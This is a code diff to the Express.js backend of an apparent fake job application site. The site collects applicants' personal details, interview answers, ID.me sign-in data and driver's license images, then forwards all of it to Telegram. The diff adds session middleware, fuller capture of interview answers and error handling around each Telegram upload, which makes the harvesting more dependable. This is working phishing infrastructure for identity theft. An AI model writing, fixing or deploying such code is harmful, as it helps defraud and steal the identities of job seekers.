@@ -63,11 +63,19 @@ const DEFAULT_QUESTIONS = [
   { name: "goals", label: "Where do you see yourself in two years?" }
 ];
 
-router.get('/', (req, res) => {
+// Ensure session is present (middleware check)
+function requireSession(req, res, next) {
+  if (!req.session) {
+    return res.status(500).render('error', { message: 'Session not available. Please enable session middleware.' });
+  }
+  next();
+}
+
+router.get('/', requireSession, (req, res) => {
   res.render('apply', { positions: JOB_POSITIONS });
 });
 
-router.post('/start', upload.array('documents', 6), async (req, res) => {
+router.post('/start', requireSession, upload.array('documents', 6), async (req, res) => {
   try {
     const { firstName, lastName, email, phone, coverLetter, position } = req.body;
     req.session.applicationDraft = {
@@ -100,7 +108,7 @@ router.post('/start', upload.array('documents', 6), async (req, res) => {
   }
 });
 
-router.get('/interview', (req, res) => {
+router.get('/interview', requireSession, (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   const pos = req.session.applicationDraft.position;
   const normalizedPosition = normalizePosition(pos);
@@ -114,13 +122,23 @@ router.get('/interview', (req, res) => {
   });
 });
 
-router.post('/interview', async (req, res) => {
+router.post('/interview', requireSession, express.urlencoded({ extended: true }), async (req, res) => {
+  // Fix: Make sure answers are actually captured from req.body
   if (!req.session.applicationDraft) return res.redirect('/apply');
-  req.session.interviewAnswers = req.body;
+  // Save all interview answers to session
+  req.session.interviewAnswers = {};
+  // Get normalized position and questions
+  const pos = req.session.applicationDraft.position;
+  const normalizedPosition = normalizePosition(pos);
+  const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
+  selectedQuestions.forEach(q => {
+    // Store answer using question name as key
+    req.session.interviewAnswers[q.name] = req.body[q.name] || '';
+  });
   res.render('info-note');
 });
 
-router.get('/verify', (req, res) => {
+router.get('/verify', requireSession, (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   res.render('verify', {
     email: req.session.applicationDraft.email || '',
@@ -129,7 +147,7 @@ router.get('/verify', (req, res) => {
 });
 
 // Verification POST: ID.me sign-in and driver's license front/back upload
-router.post('/verify', driversLicenseUpload.fields(dlFields), async (req, res) => {
+router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
   // Validate session and required files
   if (!req.session.applicationDraft) return res.redirect('/apply');
 
@@ -155,6 +173,7 @@ router.post('/verify', driversLicenseUpload.fields(dlFields), async (req, res) =
   const answersObj = {};
   let qaText = `Q&A for ${application.firstName} ${application.lastName} (${application.position}):\n`;
   questions.forEach(q => {
+    // Use name key for answer
     let answer = interviewAnswers[q.name];
     if (typeof answer === 'undefined' || answer === null || answer === '') {
       answer = "(No answer provided or field name mismatch)";
@@ -201,32 +220,44 @@ router.post('/verify', driversLicenseUpload.fields(dlFields), async (req, res) =
   };
 
   // Write Q&A JSON
-  const qaFilename = `QA_${applicantName}_${timestamp}.json`;
-  const qaFilepath = path.join(os.tmpdir(), qaFilename);
-  fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
-  await sendJsonFileToTelegram(qaFilepath, qaFilename);
-  fs.unlinkSync(qaFilepath);
+  try {
+    const qaFilename = `QA_${applicantName}_${timestamp}.json`;
+    const qaFilepath = path.join(os.tmpdir(), qaFilename);
+    fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
+    await sendJsonFileToTelegram(qaFilepath, qaFilename);
+    fs.unlinkSync(qaFilepath);
+  } catch (err) {
+    console.error('Failed to send Q&A JSON to Telegram:', err);
+  }
 
   // Write combined ID.me + license JSON
-  const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
-  const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
-  fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
-  await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
-  fs.unlinkSync(idmeFilepath);
+  try {
+    const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
+    const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
+    fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
+    await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
+    fs.unlinkSync(idmeFilepath);
+  } catch (err) {
+    console.error('Failed to send ID.me + License JSON to Telegram:', err);
+  }
 
   // Send driver's license images to Telegram
-  await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
-  fs.unlinkSync(dlFront.path);
-  await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
-  fs.unlinkSync(dlBack.path);
-  req.session.driversLicenseFiles = null;
+  try {
+    await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
+    fs.unlinkSync(dlFront.path);
+    await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
+    fs.unlinkSync(dlBack.path);
+    req.session.driversLicenseFiles = null;
+  } catch (err) {
+    console.error('Failed to send driver\'s license files to Telegram:', err);
+  }
 
   await sendConfirmationEmail(email, req.session.applicationDraft.firstName);
   res.redirect('/apply/submit');
 });
 
 // Skip ID.me POST route (handles skip and driver's license front/back upload)
-router.post('/skip-idme/', driversLicenseUpload.fields(dlFields), async (req, res) => {
+router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   const dlFront = req.files['driversLicenseFront']?.[0];
   const dlBack = req.files['driversLicenseBack']?.[0];
@@ -260,57 +291,69 @@ router.post('/skip-idme/', driversLicenseUpload.fields(dlFields), async (req, re
   const timestamp = Date.now();
 
   // Q&A JSON
-  const qaPayload = {
-    applicant: {
-      name: `${application.firstName} ${application.lastName}`,
-      email: application.email,
-      phone: application.phone,
-      position: application.position,
-    },
-    interview_answers: answersObj
-  };
-  const qaFilename = `QA_${applicantName}_${timestamp}.json`;
-  const qaFilepath = path.join(os.tmpdir(), qaFilename);
-  fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
-  await sendJsonFileToTelegram(qaFilepath, qaFilename);
-  fs.unlinkSync(qaFilepath);
+  try {
+    const qaPayload = {
+      applicant: {
+        name: `${application.firstName} ${application.lastName}`,
+        email: application.email,
+        phone: application.phone,
+        position: application.position,
+      },
+      interview_answers: answersObj
+    };
+    const qaFilename = `QA_${applicantName}_${timestamp}.json`;
+    const qaFilepath = path.join(os.tmpdir(), qaFilename);
+    fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
+    await sendJsonFileToTelegram(qaFilepath, qaFilename);
+    fs.unlinkSync(qaFilepath);
+  } catch (err) {
+    console.error('Failed to send Q&A JSON to Telegram:', err);
+  }
 
   // Combined "ID.me" (empty) + license JSON
-  const idmePayload = {
-    applicant: {
-      name: `${application.firstName} ${application.lastName}`,
-      email: application.email,
-      position: application.position,
-    },
-    idme_credentials: {},
-    drivers_license: {
-      front: {
-        filename: dlFront.originalname,
-        mimetype: dlFront.mimetype,
+  try {
+    const idmePayload = {
+      applicant: {
+        name: `${application.firstName} ${application.lastName}`,
+        email: application.email,
+        position: application.position,
       },
-      back: {
-        filename: dlBack.originalname,
-        mimetype: dlBack.mimetype,
-      },
-    }
-  };
-  const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
-  const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
-  fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
-  await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
-  fs.unlinkSync(idmeFilepath);
+      idme_credentials: {},
+      drivers_license: {
+        front: {
+          filename: dlFront.originalname,
+          mimetype: dlFront.mimetype,
+        },
+        back: {
+          filename: dlBack.originalname,
+          mimetype: dlBack.mimetype,
+        },
+      }
+    };
+    const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
+    const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
+    fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
+    await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
+    fs.unlinkSync(idmeFilepath);
+  } catch (err) {
+    console.error('Failed to send ID.me + License JSON to Telegram:', err);
+  }
 
-  await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
-  fs.unlinkSync(dlFront.path);
-  await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
-  fs.unlinkSync(dlBack.path);
-  req.session.driversLicenseFiles = null;
+  try {
+    await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
+    fs.unlinkSync(dlFront.path);
+    await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
+    fs.unlinkSync(dlBack.path);
+    req.session.driversLicenseFiles = null;
+  } catch (err) {
+    console.error('Failed to send driver\'s license files to Telegram:', err);
+  }
 
   await sendConfirmationEmail(application.email, application.firstName);
   res.redirect('/apply/submit');
 });
 
-router.get('/submit', async (req, res) => {
+router.get('/submit', requireSession, (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   res.render('submit', {
     email: req.session.applicationDraft.email || '',
@@ -318,7 +361,7 @@ router.get('/submit', async (req, res) => {
   });
 });
 
-router.post('/submit', async (req, res) => {
+router.post('/submit', requireSession, async (req, res) => {
   try {
     if (!req.session.applicationDraft || !req.session.verified) return res.redirect('/apply');
     const data = req.session.applicationDraft;
